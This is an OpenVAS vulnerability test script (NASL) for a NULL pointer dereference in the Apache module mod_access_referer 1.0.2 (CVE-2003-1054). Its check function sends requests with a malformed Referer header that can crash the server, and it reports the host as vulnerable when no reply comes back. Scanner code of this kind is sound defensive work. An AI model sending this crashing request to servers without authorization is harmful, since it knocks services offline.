# OpenVAS Vulnerability Test
# $Id: mod_access_referer.nasl 17 2013-10-27 14:01:43Z jan $
# Description: mod_access_referer 1.0.2 NULL pointer dereference
#
# Authors:
# Xue Yong Zhi (xueyong@udel.edu)
#
# Copyright:
# Copyright (C) 2003 Xue Yong Zhi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote web server may be using a mod_access_referer 
apache module which contains a NULL pointer dereference 
bug, Abuse of this vulnerability can possibly be used
in denial of service attackers against affected systems.";

tag_solution = "Try another access control module, mod_access_referer
has not been updated for a long time.";

# Ref:
# Date: Wed, 16 Apr 2003 23:14:33 +0200
# From: zillion <zillion@safemode.org>
# To: vulnwatch@vulnwatch.org
# Subject: [VulnWatch] Apache mod_access_referer denial of service issue

if(description)
{
 script_id(11543); 
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2003-1054");
 script_bugtraq_id(7375);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");

 name = "mod_access_referer 1.0.2 NULL pointer dereference";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_description(desc);
 
 summary = "Apache module mode_access_referer 1.0.2 contains a NULL pointer dereference vulnerability";
 
 script_summary(summary);
 script_category(ACT_DENIAL);
 script_copyright("This script is Copyright (C) 2003 Xue Yong Zhi");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/apache");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);



if(!get_port_state(port))exit(0);


function check(req)
{
  #As you see, the Referer part is malformed.
  #And it depends on configuration too -- there must be an IP
  #addresses based access list for mod_access_referer.

  soc = http_open_socket(port);
  if(!soc)exit(0);

  req = http_get(item:req, port:port);
  idx = stridx(req, string("\r\n\r\n"));
  req = insstr(req, string("\r\nReferer: ://www.openvas.org\r\n\r\n"), idx);
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  if ( "HTTP">< r ) return(0);
  
  security_warning(port);
  exit(0);
}

# first to make sure it's a working webserver

req = http_get(item:"/", port:port);
idx = stridx(req, string("\r\n\r\n"));
req = insstr(req, string("\r\nReferer: http://www.openvas.org\r\n\r\n"), idx);
r = http_keepalive_send_recv(port:port, data:req);
if(r==NULL) exit(0);
if("HTTP">!<r) exit(0);

# We do not know which dir is under control of the
# mod_access_reeferer, just try some...

dirs = get_kb_item(string("www/", port, "/content/directories"));
if(isnull(dirs))dirs = make_list("/");

foreach dir (make_list(cgi_dirs(),"/", dirs))
{
 if(dir && check(req:dir)) exit(0);
}
